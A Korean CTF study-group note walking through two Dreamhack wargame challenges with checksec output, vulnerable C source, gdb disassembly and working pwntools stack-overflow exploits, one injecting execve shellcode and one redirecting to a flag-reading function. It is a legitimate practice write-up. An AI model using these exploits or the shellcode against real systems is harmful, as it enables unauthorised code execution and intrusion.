# CTF-study_week01

> _필수과제 두문제 풀이와 각자 공부한 내용에 대해 간단하게 발표하는 시간을 갖겠습니다._

---
## assignment 1
[basic_exploitation_000](https://dreamhack.io/wargame/challenges/2)


### 1. 보호 기법 확인
```c
//checksec 파일명 or checksec --file 파일명

Ubuntu 16.04
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```
어떠한 보호기법도 적용x

32bit 환경이기 때문에 스택프레임구조는 buf(n) | sfp(4) | ret(4) 
no relro -> got overwrite 가능
no canary found -> bof공격 가능
nx disabled -> shellcode 삽입가능
no pie -> 주소 변경 없음 

checksec 는 실행파일에 걸려 있는 보안 메커니즘을 확인해 주는 셸 스크립트입니다.

```c
//ls -l

total 20
-rw-r--r-- 1 unstraw0454 unstraw0454 5896 Mar 16 23:30 basic_exploitation_000
-rw-r--r-- 1 unstraw0454 unstraw0454  450 Mar 16 23:30 basic_exploitation_000.c
-rw-r--r-- 1 unstraw0454 unstraw0454  105 Mar 16 23:30 basic_exploitation_000.c:Zone.Identifier
-rw-r--r-- 1 unstraw0454 unstraw0454  105 Mar 16 23:30 basic_exploitation_000:Zone.Identifier
```
실행권한이 없으니 실행 권한을 줍니다.

`chmod +x basic_exploitation_000`

```c
//./basic_exploitation_000 실행하면..
 
buf = (0xffeb0078)
>
```
실행할때마다 buf 값이 계속 다르게 나온다...
`ASLR`이 걸려있구나..

간단하게보면 
```c
//basic_exploitation_000.c

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);

    return 0;
}
```
공백포함 141의 str을 받을 수 있는데 buf크기가 0x80(128)이니 bof가 발생할 수 있다. 


### 2. gdb
`disass main`
```c
Dump of assembler code for function main:
   0x080485d9 <+0>:     push   ebp
   0x080485da <+1>:     mov    ebp,esp
   0x080485dc <+3>:     add    esp,0xffffff80
   0x080485df <+6>:     call   0x8048592 <initialize>
   0x080485e4 <+11>:    lea    eax,[ebp-0x80]
   0x080485e7 <+14>:    push   eax
   0x080485e8 <+15>:    push   0x8048699
   0x080485ed <+20>:    call   0x80483f0 <printf@plt>
   0x080485f2 <+25>:    add    esp,0x8
   0x080485f5 <+28>:    lea    eax,[ebp-0x80]
   0x080485f8 <+31>:    push   eax
   0x080485f9 <+32>:    push   0x80486a5
   0x080485fe <+37>:    call   0x8048460 <__isoc99_scanf@plt>
   0x08048603 <+42>:    add    esp,0x8
   0x08048606 <+45>:    mov    eax,0x0
   0x0804860b <+50>:    leave
   0x0804860c <+51>:    ret
End of assembler dump.
```
` 0x080485f5 <+28>:    lea    eax,[ebp-0x80]` 에서 
buf의 할당된 크기가 0x80임을 알 수 있다.


### 3. Payload
```py
from pwn import *

r= remote("host3.dreamhack.games",23029)

r.recvuntil("(")
buf = int (r.recv(10),16)
r.recvline()

payload =  b"\x31\xc0\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x08\xfe\xc0\xfe\xc0\xfe\xc0\xcd\x80"
payload += b'A'* (0x80-len(payload))
payload += b'B' *0x4
payload += p32(buf)
print(payload)
#context.log_level = "debug"
r.sendline(payload)
r.interactive()
```
shellcode 가 없으므로 `shellcode`를 넣어줘야한다. <br>scanf를 우회할수있는 32bit 쉘코드는 `"\x31\xc0\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x08\xfe\xc0\xfe\xc0\xfe\xc0\xcd\x80"`

buf크기 (0x80(shellcode 포함)) + SEP(0x4) + RET(0x4)

 
## assignment 2
[basic_exploitation_001](https://dreamhack.io/wargame/challenges/3)
### 1. 보호기법 확인
```c
//checksec 파일명 or checksec --file 파일명

Ubuntu 16.04
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


void read_flag() {
    system("cat /flag");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    gets(buf);

    return 0;
}
```
`gets` 입력 함수는 bof 취약한 함수이다.
buf크기 만큼 덮고 SFP (4) 만큼 덮고 RET 로 read_flag() 함수 주소를 적으면된다.

### 2. gdb
gdb로 `info func`를 통해 read_flag의 함수주소를 본다.
0x080485b9

### 3. Payload 
```py
from pwn import *

r= remote("host3.dreamhack.games",17163)

payload = b'A'*0x80
payload += b'B'*0x4
payload += p32(0x080485b9)
r.sendline(payload)
r.interactive()
```

## bof basic 문제
[ELF x64 - Stack buffer overflow - basic](https://www.root-me.org/en/Challenges/App-System/ELF-x64-Stack-buffer-overflow-basic)

---
- 어떤 문제를 풀지 정해줄까 아니면 각자 풀고 싶은 워게임 풀어오는 것으로 할까🤔?..<br>
 필수과제 + 선택과제 는 어떤지? 
 
# 과제


## 참고자료
[checksec 보호기법](https://hackyboiz.github.io/2021/10/27/y00n_nms/linux-mitigation/)

[shellcode](https://yun-2.tistory.com/entry/Dreamhack-Level2-basicexploitation000)
